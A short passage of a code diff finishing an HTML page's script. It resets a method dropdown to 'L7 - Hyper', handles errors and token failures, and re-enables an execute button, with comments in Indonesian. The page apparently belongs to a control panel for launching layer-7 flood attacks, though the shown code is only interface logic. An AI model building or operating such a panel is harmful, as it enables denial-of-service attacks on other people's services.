+                        const customSelect = document.getElementById('custom-select-metode');
+                        customSelect.querySelector('.select-selected').innerHTML = "L7 - Hyper";
+                        customSelect.querySelector('#l7-metode-value').value = "hyper";
+                        customSelect.querySelectorAll('.select-items div').forEach(opt => {
+                             opt.classList.toggle('same-as-selected', opt.dataset.value === 'hyper');
+                        });
+
+                    } catch (error) {
+                        showNotification('l7-notification', error.message, 'error');
+                        if (error.message.includes("Token Gagal")) {
+                            setTimeout(() => {
+                                localStorage.removeItem('user');
+                                window.location.href = 'index.html';
+                            }, 1500);
+                        }
+                    } finally {
+                        enableButton(l7ExecuteBtn); // Fungs-i updateGitLabFile sudah menangani ini, tapi sbg fallback
+                    }
+                    // --- AKHIR BLOK LOGIKA ASLI ---
+                });
+            }
+
+        });
+    </script>
+
+</body>
+</html>
